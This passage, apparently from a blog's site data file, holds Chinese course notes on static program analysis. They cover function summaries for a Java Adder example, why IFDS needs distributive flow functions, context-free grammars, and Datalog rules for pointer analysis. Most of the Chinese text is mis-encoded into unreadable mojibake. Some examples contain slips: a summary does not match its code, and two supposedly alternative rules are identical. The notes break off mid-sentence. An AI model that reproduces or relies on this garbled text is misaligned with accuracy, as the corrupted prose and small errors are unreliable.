class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Adder</span> </span>&#123; <span class="function">String <span class="title">add</span><span class="params">(String a,String b)</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder1</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder2</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+<span class="string">"b"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdderAgent</span> <span class="keyword">implements</span> <span class="title">Adder</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Adder adder;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AdderAgent</span><span class="params">(Adder a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.adder = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">(String a, String b)</span></span>&#123; <span class="comment">// summary this</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.adder.add(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">add</span><span class="params">(Adder adder, String a, String b)</span></span>&#123; <span class="comment">// summary this</span></span><br><span class="line">        <span class="keyword">return</span> adder.add(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å¯¹<code>AdderAgent.add(Adder adder, String a, String b)</code>åšå‡½æ•°æ‘˜è¦ï¼Œé‚£ä¹ˆå…¶å› ä¸ºä¾èµ–äºadderçš„å®ç°ï¼Œå°±å¯èƒ½éœ€è¦åšä¸¤ä»½æ‘˜è¦ï¼Œå³è‹¥adder=Adder1æ—¶ï¼Œå…¶æ‘˜è¦æ˜¯$\langle(ret\rightarrow a+b),(ret\rightarrow any)\rangle$ï¼Œè‹¥adder=Adder2æ—¶ï¼Œå…¶æ‘˜è¦æ˜¯$\langle(ret\rightarrow a),(ret\rightarrow any)\rangle$ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦åšä¸¤ä»½å‡½æ•°æ‘˜è¦ï¼Œè¿™é‡Œä»½æ•°å–å†³äºAdderå­ç±»çš„ä¸ªæ•°ã€‚</p><p>æ­¤å¤–ï¼Œå¯¹<code>AdderAgent.add(String a, String b)</code>è¿˜è¦ä¿å­˜å…¶æˆå‘˜å˜é‡ï¼ˆself.adderï¼‰çš„ç±»å‹ã€‚</p><h1 id="Understanding-the-Distributivity-of-IFDS"><a href="#Understanding-the-Distributivity-of-IFDS" class="headerlink" title="Understanding the Distributivity of IFDS"></a>Understanding the Distributivity of IFDS</h1><p>IFDSä¸èƒ½åšFlow functionä¸æ»¡è¶³åˆ†é…æ€§ï¼ˆ$F(x \wedge y) \neq F(x) \wedge F(y)$ï¼‰çš„æ•°æ®æµåˆ†æã€‚</p><p>ä»¥<strong>å¸¸é‡ä¼ æ’­</strong>ä¸ºä¾‹ï¼Œè€ƒè™‘<code>z=x+y</code>ï¼Œè®¾è®¡çš„Flow functionä¸º$(x,y,_)\rightarrow(x+y,_)$ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªè¾“å‡ºæ˜¯ä¸¤ä¸ªè¾“å…¥<strong>â€œåŒæ—¶â€</strong>å†³å®šçš„ï¼Œåœ¨representation relationä¸­æ˜¯æ— æ³•è¡¨ç¤ºçš„ï¼Œæ¢å¥è¯è¯´ï¼Œ<strong>IFDSåªèƒ½æè¿°data factï¼ˆç‚¹ï¼‰å’Œpropagationï¼ˆè¾¹ï¼‰èƒ½è¢«ç‹¬ç«‹å¤„ç†çš„åˆ†æé—®é¢˜</strong>ï¼ˆæŒ‰ä¸ªäººç†è§£ï¼ŒIFDSèƒ½å¤„ç†çš„ä¸€ä¸ªåŸå­æ“ä½œå°±æ˜¯$a \rightarrow b$ï¼Œå¯ä»¥ç‹¬ç«‹è¡¨ç¤º$a\rightarrow b,c\rightarrow b,b\rightarrow b$ï¼Œè€Œä¸èƒ½è¡¨ç¤º$a\wedge c \rightarrow b$ï¼‰ã€‚</p><p>åŒæ ·ï¼ŒIFDSä¸èƒ½ç”¨äº<strong>æŒ‡é’ˆåˆ†æ</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“å¤„ç†<code>z=y.f</code>è¯­å¥æ—¶ï¼Œç”±äºæ²¡æœ‰åˆ«åä¿¡æ¯ï¼Œæ— æ³•è¿æ¥$x\rightarrow y.f$è¾¹ï¼Œå› æ­¤åˆ†æç»“æœæ˜¯é”™è¯¯çš„ï¼Œè€Œè‹¥åŠ ä¸Šåˆ«ååˆ†æï¼Œå› ä¸ºåˆæ˜¯å¤šè¾“å…¥ï¼Œå› æ­¤æŒ‡é’ˆåˆ†æä¹Ÿä¸æ»¡è¶³åˆ†é…æ€§ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913202232341.png" alt="image-20200913202232341"></p><p>IDEï¼ˆInterproceduralï¼ŒDistributiveï¼ŒEnvironment problemï¼‰ä½œä¸ºIFDSçš„ä¼˜åŒ–ï¼Œå¯ä»¥è§£å†³infiniteçš„é—®é¢˜ï¼Œä½†æ˜¯ä»éœ€æ»¡è¶³distributiveã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚è¯¾è®²äº†IFDSçš„å¤§è‡´æ€è·¯ï¼Œè¯¦ç»†è¿˜éœ€çœ‹æœ€åˆçš„è®ºæ–‡ï¼Œæ³¨æ„IFDSå’Œä¼ ç»Ÿçš„content-sensitiveæ˜¯æ²¡æœ‰å¯æ¯”æ€§çš„ã€‚</p><h1 id="Appendix-Context-free-Grammar"><a href="#Appendix-Context-free-Grammar" class="headerlink" title="Appendix: Context-free Grammar"></a>Appendix: Context-free Grammar</h1><blockquote><p>CFG is a formal grammar in which every production is of the form:</p><script type="math/tex; mode=display">S \rightarrow \alpha</script><p>where $S$ is  a single nonterminal and $\alpha$ could be a string of terminals and/or nonterminals,or empty.</p></blockquote><p>ç®€å•è¯´ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•å®šä¹‰äº†ä¸€ä¸ªå¥å­çš„ç”Ÿæˆè§„èŒƒï¼Œå³ $S\rightarrow \alpha$ ï¼Œå…¶ä¸­$S$ä¸ºä¸€ä¸ªéç»ˆç»“ç¬¦ï¼Œ$\alpha$å¯ä»¥ä½¿ä¸€ä¸ªç»ˆç»“/éç»ˆç»“ç¬¦å·ï¼Œæˆ–è€…æ˜¯ç©º($\varepsilon$)ã€‚</p><p>ä¾‹å¦‚æœ‰å¦‚ä¸‹ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼š</p><ul><li>$S \rightarrow aSb$</li><li>$S \rightarrow \varepsilon$</li></ul><p>é‚£ä¹ˆå¯ä»¥ç”Ÿæˆä¸€ä¸‹å¥å­â€abâ€œï¼Œâ€œaabbâ€ï¼Œâ€¦</p><p>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ä¸ä¸Šä¸‹æ–‡ç›¸å…³ï¼ˆContext-sensitiveï¼‰æ–‡æ³•çš„åŒºåˆ«å°±åœ¨äºè¯­å¥ç”Ÿæˆè§„åˆ™ï¼Œæ— å…³æ–‡æ³•å¯ä»¥æ— è§†ä¸Šä¸‹æ–‡éšæ„åº”ç”¨è§„åˆ™ï¼Œè€Œç›¸å…³æ–‡æ³•çš„æ¯ä¸ªè§„åˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸‹æ‰æˆç«‹çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Precise Interprocedural Dataflow Analysis via Graph Reachability. Thomas Reps, Susan Horwitz, and Mooly Sagiv, POPLâ€™95</li></ol>]]></content>
      
      
      <categories>
          
          <category> Program Language </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç™½ç›’æ‰«æ </tag>
            
            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
            <tag> æ±¡ç‚¹åˆ†æ </tag>
            
            <tag> æŒ‡é’ˆåˆ†æ </tag>
            
            <tag> IFDS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Datalog%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88Datalog%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>å…ˆå‰çš„åˆ†æç®—æ³•è™½ç„¶å±•ç¤ºäº†åˆ†æç»†èŠ‚ï¼Œä½†æ˜¯è¿‡äºå¤æ‚éš¾ä»¥å®ç°ï¼Œæœ¬è¯¾å°†ä»‹ç»ä¸€ç§ä¸€ç§å£°æ˜å¼è¯­è¨€ï¼ˆDatalogï¼‰ä»¥æ•°æ®é©±åŠ¨æ¨å¯¼çš„æ–¹å¼åšæŒ‡é’ˆåˆ†æå’Œæ±¡ç‚¹åˆ†æ</p><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><h2 id="Imperative-vs-Declarative"><a href="#Imperative-vs-Declarative" class="headerlink" title="Imperative vs Declarative"></a>Imperative vs Declarative</h2><p>Imperativeï¼ˆå‘½ä»¤å¼ï¼‰è¯­è¨€ä¸»è¦æœ‰Javaã€C/C++ç­‰ï¼Œå±•ç¤ºäº†è¯¦ç»†çš„å®ç°ç»†èŠ‚ï¼›</p><a id="more"></a><p>Declarativeï¼ˆå£°æ˜å¼ï¼‰è¯­è¨€ä¸»è¦æœ‰SQLç­‰ï¼Œå…¶å±è”½ç»†èŠ‚ï¼Œå› æ­¤ä»£ç é‡æ›´å°ï¼Œå¯è¯»æ€§æ›´å¼ºã€‚</p><p>å¦‚å¯¹äºæŸ¥æ‰¾æˆå¹´äººçš„ç¨‹åºï¼Œå‘½ä»¤å¼è¯­è¨€å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Set&lt;Person&gt; <span class="title">selectAdults</span><span class="params">(Set&lt;Person&gt; persons)</span> </span>&#123;</span><br><span class="line">    Set&lt;Person&gt; result = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Person person : persons)</span><br><span class="line">        <span class="keyword">if</span> (person.getAge() &gt;= <span class="number">18</span>)</span><br><span class="line">            result.add(person);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œå£°æ˜å¼è¯­è¨€å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Persons <span class="keyword">WHERE</span> Age &gt;= <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>å¯è§å‘½ä»¤å¼è¯­è¨€ä¸»è¦å¼ºè°ƒå¦‚ä½•åšï¼Œè€Œå£°æ˜å¼è¯­è¨€å¼ºè°ƒçš„æ˜¯åšä»€ä¹ˆã€‚</p><h1 id="Introduction-to-Datalog"><a href="#Introduction-to-Datalog" class="headerlink" title="Introduction to Datalog"></a>Introduction to Datalog</h1><p>Datalog æ˜¯ä¸€ç§å£°æ˜å¼è¯­è¨€ï¼Œæ˜¯ Prolog çš„å­é›†ï¼Œæœ€æ—©ç”¨äºæ•°æ®åº“æŸ¥è¯¢[1]ï¼Œè€Œå¦‚ä»Šå·²ç»è¢«ç”¨äºç¨‹åºåˆ†æã€å¤§æ•°æ®ã€äº‘è®¡ç®—ç­‰å¤šä¸ªé¢†åŸŸ</p><p>Datalog å³ â€œData+Logicâ€ï¼Œå…¶ç¨‹åºæ²¡æœ‰æ§åˆ¶æµï¼Œæ²¡æœ‰å‡½æ•°ï¼Œä¸æ˜¯ä¸€ä¸ªå›¾çµå®Œå¤‡çš„è¯­è¨€ã€‚</p><h2 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h2><h3 id="Predicates"><a href="#Predicates" class="headerlink" title="Predicates"></a>Predicates</h3><p>Datalog ä¸­æ•°æ®ç”¨è°“è¯ï¼ˆPredicatesï¼‰è¡¨ç¤ºï¼Œå…·ä½“æ¥è¯´ï¼Œè°“è¯æ˜¯ä¸€å¼ æ•°æ®è¡¨ï¼Œè¡¨ä¸­çš„æ¯æ¡æ•°æ®ååº”ä¸€ä¸ªäº‹å®ï¼ˆfactï¼‰ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:center">person</th><th>age</th></tr></thead><tbody><tr><td style="text-align:center">xiaoming</td><td>18</td></tr><tr><td style="text-align:center">xiaohong</td><td>23</td></tr></tbody></table></div><p>å¦‚ä»¥ä¸Šä¸ºAgeè¡¨ï¼Œ<strong>Age</strong>å°±æ˜¯ä¸€ä¸ªè°“è¯ï¼Œè€Œåœ¨Ageä¸­ <code>(&quot;xiaoming&quot;,18)</code> è¡¨ç¤ºâ€œå°æ˜æ˜¯18å²â€œï¼Œè¿™æ˜¯ä¸€ä¸ªäº‹å®ï¼Œè€Œ<code>(&quot;xiaohong&quot;,22)</code>è¡¨ç¤º â€œå°çº¢æ˜¯22å²â€ï¼Œè¡¨ä¸­æ²¡æœ‰è¿™ä¸ªæ•°æ®ï¼Œå› æ­¤è¿™ä¸æ˜¯ä¸€ä¸ªäº‹å®ã€‚</p><h3 id="Atoms"><a href="#Atoms" class="headerlink" title="Atoms"></a>Atoms</h3><p>Datalogä¸­çš„è°“è¯ç”¨ Atom è¡¨ç¤ºï¼Œä¸€ä¸ª Atom ï¼ˆå®é™…ä¸Šæ˜¯å…³ç³»å‹åŸå­â€”â€”relational atomï¼‰å½¢å¦‚<code>P(X1,X2,...,Xn)</code>ï¼Œå…¶ä¸­ <code>P</code> è¡¨ç¤ºè°“è¯åç§°ï¼Œè€Œ<code>X1,X2,...,Xn</code> è¡¨ç¤ºè°“è¯çš„å‚æ•°ï¼ˆArguments/termsï¼‰ï¼Œå‚æ•°æ˜¯å¯ä¸ºå˜é‡æˆ–æ˜¯å¸¸é‡ï¼Œè‹¥è¡¨ä¸­å­˜åœ¨æ•°æ®ï¼Œåˆ™å…³ç³»å‹æ•°æ®ä¸ºçœŸï¼Œå¦åˆ™</p><p>ä¾‹å¦‚å…ˆå‰Ageè°“è¯ï¼Œæœ‰å¦‚ä¸‹Atomsï¼š</p><ul><li><code>Age(person, age)</code></li><li><code>Age(&quot;xiaoming&quot;, 18)</code></li></ul><p>Atom å¦ä¸€ç±»ç§°ä¸ºç®—æ•°å‹åŸå­ï¼ˆarithmetic atomsï¼‰ï¼Œç”±ç®—æ•°è¡¨è¾¾å¼ç»„æˆï¼Œä¾‹å¦‚ï¼š</p><ul><li><code>age &gt;= 18</code></li></ul><h2 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h2><h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><p>Rules åœ¨ Datalog ä¸­å®šä¹‰äº†factsçš„æ¨å¯¼è¿‡ç¨‹ï¼Œä¸€ä¸ªruleså½¢å¦‚ <code>H &lt;- B1, B2, ... ,Bn</code>ï¼Œå…¶ä¸­ <code>H</code> ï¼ˆheadï¼‰ä¸ºä¸€ä¸ª atomï¼Œè¡¨ç¤ºç»“è®ºï¼ˆconsequentï¼‰ï¼Œ<code>B1,B2,...,Bn</code> ï¼ˆbodyï¼‰è¡¨ç¤ºå‰ææ¡ä»¶ï¼ˆantecedentï¼‰ï¼ŒBiè¡¨ç¤ºä¸€ä¸ªå­ç›®æ ‡ï¼ˆsubgoalï¼‰ï¼Œ<code>,</code> è¡¨ç¤ºé€»è¾‘ä¸å…³ç³»ï¼Œå³ä¸Šä¾‹è¡¨ç¤ºâ€œå½“B1ã€B2ã€â€¦ã€Bnéƒ½æˆç«‹æ—¶ï¼ŒHæˆç«‹â€ã€‚</p><p>Datalog è¿è¡Œæ—¶å°†ä¸æ–­ä»å·²çŸ¥äº‹å®ä¸­æ¨å‡ºæ–°äº‹å®ï¼Œå½“æ— æ³•å†æ¨å‡ºæ–°çš„äº‹å®æ—¶ï¼Œç¨‹åºåœæ­¢ã€‚</p><h3 id="EDBå’ŒIDB"><a href="#EDBå’ŒIDB" class="headerlink" title="EDBå’ŒIDB"></a>EDBå’ŒIDB</h3><p>é€šå¸¸æ¥è¯´ï¼ŒDatalog æœ‰ä¸¤ç±»è°“è¯ï¼ŒEDBå’ŒIDBï¼š</p><p>EDBï¼ˆExtensional databaseï¼‰ï¼šEDBè°“è¯æ˜¯é¢„å…ˆå®šä¹‰å¥½çš„ï¼Œé€šå¸¸ä¸å¯å˜ï¼Œä½œä¸ºdatalogçš„è¾“å…¥ï¼ˆå³å¤–éƒ¨ä¼ å…¥ï¼Œextensionalï¼‰</p><p>IDBï¼ˆIntensional databaseï¼‰ï¼šIDB è°“è¯é€šå¸¸ç”±rulesæ¨å¯¼å‡ºï¼Œé€šå¸¸æ˜¯datalogçš„è¾“å‡ºã€‚</p><h3 id="Logical-Or"><a href="#Logical-Or" class="headerlink" title="Logical Or"></a>Logical Or</h3><p>æœ‰ä¸¤ç§æ–¹å¼è¡¨ç¤ºé€»è¾‘æˆ–ï¼š</p><ol><li><p>ç¼–å†™å¤šæ¡æ¨å¯¼è§„åˆ™ï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GradeOne(Person) &lt;- Age(person,<span class="number">17</span>).</span><br><span class="line">GradeOne(Person) &lt;- Age(person,<span class="number">17</span>).</span><br></pre></td></tr></table></figure></li><li><p>ç”¨<code>;</code>åˆ†å‰²æ¡ä»¶ï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GradeOne(person) &lt;- Age(person,<span class="number">17</span>);Age(person,<span class="number">18</span>).</span><br></pre></td></tr></table></figure></li></ol><p>æ³¨æ„ï¼Œ<code>;</code> ä¼˜å…ˆçº§ä½äº<code>,</code>ï¼Œå¦‚ä¼˜å…ˆåš<code>;</code>éœ€åŠ <code>()</code>ã€‚</p><h3 id="Negation"><a href="#Negation" class="headerlink" title="Negation"></a>Negation</h3><p><code>!</code> è¡¨ç¤ºå–åï¼Œå¦‚ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Man(person)  &lt;- Age(person, age), age&gt;=<span class="number">18</span>, !Gender(person,<span class="string">"woman"</span>).</span><br></pre></td></tr></table></figure><h3 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h3><p>Datalog æ”¯æŒé€’å½’æ¨å¯¼ï¼Œå¦‚è®¡ç®—å›¾çš„å¯è¾¾æ€§ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reach(from,to) &lt;- Edge(from, to).</span><br><span class="line">Reach(from,to) &lt;- Reach(from, node), Reach(node, to)</span><br></pre></td></tr></table></figure><p>æ­£æ˜¯ç”±äºæ”¯æŒæ¨å¯¼ï¼Œæ‰è®©Datalogè¶³å¤Ÿå¼ºå¤§ï¼Œä»¥è‡³äºèƒ½åšå¤æ‚çš„ç¨‹åºåˆ†æã€‚</p><h3 id="Rule-Safety"><a href="#Rule-Safety" class="headerlink" title="Rule Safety"></a>Rule Safety</h3><p>è€ƒè™‘å¦‚ä¸‹ä¸¤ç§å†™æ³•ï¼š</p><ul><li><code>A(x) &lt;- B(y), x &gt; y</code></li><li><code>A(x) &lt;- B(y), !C(x,y)</code></li></ul><p>ç”±äº<code>y</code>æ²¡æœ‰èŒƒå›´é™åˆ¶ï¼Œå› æ­¤è§„åˆ™æ¨å¯¼è¿‡ç¨‹æ—¶æ— é™çš„ã€‚</p><p>Datalogä¸­è§„åˆ™éœ€è¦æ»¡è¶³å®‰å…¨æ€§ï¼ˆrule safetyï¼‰ï¼Œå³ruleä¸­æ¯ä¸ªå˜é‡è‡³å°‘å‡ºç°åœ¨ä¸€ä¸ªéåçš„ relation atom ä¸­ã€‚</p><h3 id="Recursion-and-Negation"><a href="#Recursion-and-Negation" class="headerlink" title="Recursion and Negation"></a>Recursion and Negation</h3><p>è€ƒè™‘å¦‚ä¸‹è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A(x) &lt;- B(x), !A(x)</span><br></pre></td></tr></table></figure><p>åŸå­é€’å½’æ¨å¯¼äº†è‡ªå·±çš„éï¼Œå› æ­¤è¯­å¥æ—¶çŸ›ç›¾çš„ï¼Œå³ä¸€ä¸ªåŸå­çš„é€’å½’å’Œå–åå¿…é¡»æ˜¯åˆ†ç¦»çš„ã€‚</p><h2 id="Excution"><a href="#Excution" class="headerlink" title="Excution"></a>Excution</h2><p>Datalogè¾“å…¥EDBå’ŒRulesï¼Œç»è¿‡Data engineä¸æ–­æ¨å¯¼ï¼Œæœ€ç»ˆäº§ç”ŸIDBã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906204334359.png" alt="image-20200906204334359"></p><p>Datalogç¨‹åºä¸€å®šä¼šåœæ­¢ï¼Œå› ä¸ºï¼š</p><ol><li>datalogæ˜¯å•è°ƒçš„â€”â€”datalogçš„factsæ— æ³•åˆ é™¤ï¼›</li><li>datalogä¸­IDBçš„è°“è¯æ˜¯æœ‰é™çš„â€”â€”è€ƒè™‘åˆ°rule safetyã€‚</li></ol><p>å¸¸ç”¨çš„Datalogå¼•æ“æœ‰ï¼š</p><p>LogicBlox, SoufflÃ©, XSB, Datomic, Flora-2, â€¦</p><h1 id="Pointer-Analysis-via-Datalog"><a href="#Pointer-Analysis-via-Datalog" class="headerlink" title="Pointer Analysis via Datalog"></a>Pointer Analysis via Datalog</h1><p>åœ¨Datalogä¸­åšæŒ‡é’ˆåˆ†ææ—¶ï¼ŒEDBä¸ºè¯­æ³•ä¸Šèƒ½ç›´æ¥è·å–çš„ä¿¡æ¯ï¼ŒIDBä¸ºæŒ‡é’ˆåˆ†æçš„ç»“æœ<br>ï¼ŒRulesä¸ºæŒ‡é’ˆåˆ†æçš„è§„åˆ™ã€‚</p><h2 id="Datalog-Model"><a href="#Datalog-Model" class="headerlink" title="Datalog Model"></a>Datalog Model</h2><p>å®šä¹‰å˜é‡é›†åˆä¸º <code>V</code>ï¼ŒåŸŸä¸º <code>F</code>ï¼Œå¯¹è±¡ä¸º <code>O</code>ã€‚</p><p>é‚£ä¹ˆEDBå¯ä»¥å®šä¹‰ä¸ºï¼š</p><div class="table-container"><table><thead><tr><th>Kind</th><th>Statement</th><th>EDB</th></tr></thead><tbody><tr><td>New</td><td>i: x = new T()</td><td><code>New(x : V, o : O)</code></td></tr><tr><td>Assign</td><td>x = y</td><td><code>Assign(x : V, y : V)</code></td></tr><tr><td>Store</td><td>x.f = y</td><td><code>Store(x : V, f : F, y : V)</code></td></tr><tr><td>Load</td><td>y = x.f</td><td><code>Load(y : V, x : V, f : F)</code></td></tr></tbody></table></div><p>å®šä¹‰IDBï¼š</p><ul><li><code>VarPointsTo(v: V, o: O)</code><br><code>VarPointsTo(x, oi)</code> è¡¨ç¤º $o_i \in pt(x)$</li><li><code>FieldPointsTo(oi: O, f: V, oj: O)</code><br><code>FieldPointsTo(oi, f, oj)</code> è¡¨ç¤º $o_j \in pt(o_i.f)$</li></ul><h2 id="Rules-1"><a href="#Rules-1" class="headerlink" title="Rules"></a>Rules</h2><p>å°†æ¨å¯¼è§„åˆ™å†™ä¸ºDatalogçš„è§„åˆ™ï¼š</p><div class="table-container"><table><thead><tr><th>Kind</th><th style="text-align:center">Statement</th><th style="text-align:center">Rule</th><th>Datalog</th></tr></thead><tbody><tr><td>New</td><td style="text-align:center">i: x = new T()</td><td style="text-align:center">$\frac{}{o_i \in pt(x)}$</td><td><code>VarPointsTo(x, o) &lt;- New(x, o).</code></td></tr><tr><td>Assign</td><td style="text-align:center">x = y</td><td style="text-align:center">$\frac{o_{i} \in p t(y)}{o_{i} \in p t(x)}$</td><td><code>VarPointsTo(x, o) &lt;- Assign(x, y), VarPointsTo(y, o).</code></td></tr><tr><td>Store</td><td style="text-align:center">x.f = y</td><td style="text-align:center">$\frac{o_i \in pt(x),\\ o_j \in pt(y)}{o_j \in pt(o_i.f)}$</td><td><code>FieldPointsTo(oi, f, oj) &lt;- Store(x, f, y), VarPointsTo(x, oi), VarPointsTo(y, oj).</code></td></tr><tr><td>Load</td><td style="text-align:center">y = x.f</td><td style="text-align:center">$\frac{o_{i} \in pt(x),\\ o_{j} \in pt\left(o_{i} . f\right)}{o_{j} \in p t(y)}$</td><td><code>VarPointsTo(y, oj) &lt;- Load(y, x, f), VarPointsTo(x, oi), FieldPointsTo(oi, f, oj).</code></td></tr></tbody></table></div><p>ä¸‹é¢ä¸¾ä¾‹è¯´æ˜</p><p>åˆå§‹é˜¶æ®µï¼Œä»ç¨‹åºä¸­æå–Newï¼ŒStoreï¼ŒAssignï¼ŒLoadè¯­å¥ä¸ºEDBï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211135591.png" alt="image-20200906211135591" style="width: 80%;"></p><p>æ¥ä¸‹æ¥å¤„ç†Newè¯­å¥ï¼Œå°†bã€cåŠ å…¥VarPointsToï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211304812.png" alt="image-20200906211304812" style="width: 80%;"></p><p>å¤„ç†Assign, ç”±$Assign(d,c), VarPointsTo(c, o_3) \rightarrow VarPointsTo(d,o_3)$ ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211352710.png" alt="image-20200906211352710" style="width: 80%;"></p><p>å¤„ç†Storeï¼Œç”± </p><p>$Store(c,f,a), VarPointsTo(c,o_3), VarPointsTo(a, o_1) \rightarrow FieldsPointsTo(o_3,f, o_1)$ï¼Œ</p><p>$Store(c,f,d), VarPointsTo(c,o_3), VarPointsTo(d, o_3) \rightarrow FieldsPointsTo(o_3,f, o_3)$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211446132.png" alt="image-20200906211446132" style="width: 80%;"></p><p>å¤„ç†Loadï¼Œç”±</p><p>$Load(e,d,f), VarPointsTo(d,o_3), FieldPointsTo(o_3,f,o_1) \rightarrow VarPointsTo(e, o_1)$;</p><p>$Load(e,d,f), VarPointsTo(d,o_3), FieldPointsTo(o_3,f,o_3) \rightarrow VarPointsTo(e, o_3)$:</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆDatalogï¼‰/image-20200906211517749.png" alt="image-20200906211517749" style="width: 80%;"></p><p>æ³¨æ„åœ¨å®é™…è¿è¡Œæ—¶ï¼Œå½“æ–°factäº§ç”Ÿåï¼Œengine ä¼šæ£€æŸ¥å½“å‰çŠ¶æ€ï¼Œå¤„ç†èƒ½å¤Ÿæ¨å¯¼çš„rulesã€‚</p><h2 id="Handle-Method-Calls"><a href="#Handle-Method-Calls" class="headerlink" title="Handle Method Calls"></a>Handle Method Calls</h2><p>å¤„ç†å‡½æ•°è°ƒç”¨éœ€è¦æ·»åŠ æ–°çš„EDBå’ŒIDBï¼Œå¹¶ä¸”å®šä¹‰ä¸‰æ¡è§„åˆ™ï¼š</p><ol><li><p>Dispatchï¼Œä¼ 